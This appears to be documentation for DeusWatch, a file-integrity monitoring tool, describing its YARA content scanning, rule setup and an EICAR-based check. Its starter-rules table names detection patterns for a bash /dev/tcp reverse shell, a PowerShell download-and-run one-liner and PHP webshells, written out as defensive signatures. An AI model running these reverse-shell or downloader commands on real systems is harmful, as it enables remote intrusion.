# YARA content scanning (FIM)

DeusWatch scans **file content** with YARA at the moment it arrives on the manager, and if any rule
matches it emits an alert event that flows through the normal severity/enrichment/response pipeline.
It's the third layer of the FIM defence — sitting alongside **file-hash reputation** (VirusTotal /
MalwareBazaar / CIRCL) and the **entropy-based ransomware detector**.

## When it fires

The scan runs inside the gateway, in the code path that receives a FIM snapshot upload from an
agent:

1. An agent detects a file change and creates a new version.
2. If the agent is configured with **Store = "on manager"** for that source, it uploads the file's
   bytes with the snapshot metadata.
3. The gateway saves the version, then runs the uploaded bytes through the compiled YARA ruleset.
4. On a match, the gateway publishes an alert with `dw_label = yara_malicious`, severity `high`, and
   `dw_filehash_verdict = yara_malicious`. The alert then behaves like any other:
   - Renders in **Events & Alerts** with the FIM verdict column filled in.
   - Escalates severity further if the file's hash also has a known-bad reputation.
   - Feeds the notify / response / dashboard as usual.

**Files whose Store is set to "on agent" are never seen manager-side**, so YARA can't scan them.
That is by design — pick "on manager" storage for the sources you care about (webroots, config
directories, upload folders). Set it per source in **Agents → Sources**.

## Rule directory

Rules live in `deploy/yara-rules/` on the host (bind-mounted into the gateway container at
`/rules/yara`). Every `*.yar` and `*.yara` file in that directory is compiled at gateway startup;
subdirectories are ignored.

- Drop new files into `deploy/yara-rules/`.
- Restart the gateway to pick them up: `docker compose -f deploy/docker-compose.yml restart gateway`.
- Look for `gateway: yara: loaded N ruleset(s) from /rules/yara` in the startup log.
- A bad rule fails the whole load — the gateway keeps the previous ruleset and logs the error.

### Starter rules

The repo ships `deploy/yara-rules/deuswatch_starter.yar`, always mounted into the gateway container.
It contains four rules useful as a proof-of-life smoke test:

| Rule | What it flags |
|---|---|
| `DeusWatch_EICAR_Test_String` | The industry-standard EICAR anti-virus test signature (harmless). |
| `DeusWatch_Suspicious_PHP_Webshell` | Common one-line PHP webshells (`system`/`exec`/`passthru`/`shell_exec` reading from `$_GET`/`$_POST`/`$_REQUEST`). |
| `DeusWatch_Suspicious_Reverse_Shell_bash` | The classic `bash -i >& /dev/tcp/HOST/PORT 0>&1` reverse shell. |
| `DeusWatch_Suspicious_Powershell_Downloader` | `IEX (New-Object Net.WebClient).DownloadString(...)` download-and-run pattern. |

### Bringing in a real ruleset

The starter set is not a substitute for a proper feed. Two well-maintained public sources:

- **Neo23x0 signature-base** — <https://github.com/Neo23x0/signature-base> — Florian Roth's living
  compendium (webshells, hack tools, malware families). GPL-2.0.
- **YARA-Rules** — <https://github.com/Yara-Rules/rules> — community collection organised by threat
  category. Various OSI licences per file.

Clone them (or specific `.yar` files) into `deploy/yara-rules/`, restart the gateway, and check the
startup log for the new rule count.

## Requirements

The gateway container is built with `CGO_ENABLED=1` and links against `libyara.so.9` (installed via
`apk add yara` in the Alpine runtime — see `deploy/Dockerfile`, `runtime-cgo` stage). If you build
your own images, ensure `yara-dev` is present at build time and `yara` at runtime.

Everything else (api, worker, certgen) stays as a distroless static build with CGO disabled — the
`internal/yara` package has a no-op fallback for that path, so `go build ./...` on a dev machine
without libyara installed still succeeds and the app still runs (YARA scanning is simply idle).

## Verifying it works

Once the gateway is up with rules loaded:

```bash
# Create the EICAR test file on an agent host in a directory FIM watches with Store="on manager":
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /path/watched/eicar.com
```

Within a few seconds the file's snapshot uploads. The gateway log will show:

```
gateway: yara MATCH web01@/path/watched/eicar.com: 1 rule(s) — DeusWatch_EICAR_Test_String
```

An alert appears on the dashboard with:

- Rule: `YARA match: DeusWatch_EICAR_Test_String`
- Severity: `high` (or `critical` if the hash also has a bad reputation)
- FIM verdict: `yara_malicious` / `matched: DeusWatch_EICAR_Test_String`

Delete the test file to keep it out of your event history.

## Trade-offs and future work

- **Only files with "on manager" storage get scanned.** Agent-side scan is a separate future
  option (each agent would need libyara).
- **Live-reload is not wired yet.** Editing `deploy/yara-rules/*.yar` requires a gateway restart.
- **Large files.** Scans have a hard 10-second ceiling; a pathological rule cannot stall the ingest
  path. Extremely large files (hundreds of MB) may want an explicit size cap — file an issue if you
  hit that.
